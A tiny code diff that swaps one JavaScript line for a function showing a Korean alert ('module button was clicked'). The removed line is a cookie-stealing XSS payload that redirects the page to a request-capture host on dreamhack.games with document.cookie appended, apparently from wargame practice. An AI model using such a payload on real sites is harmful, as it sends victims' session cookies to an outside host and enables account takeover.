@@ -1,1 +1,3 @@
-location.href="https://nuxgqki.request.dreamhack.games?param="+document.cookie
+export function showAlert() {
+    alert("모듈 버튼이 클릭되었습니다!");
+}
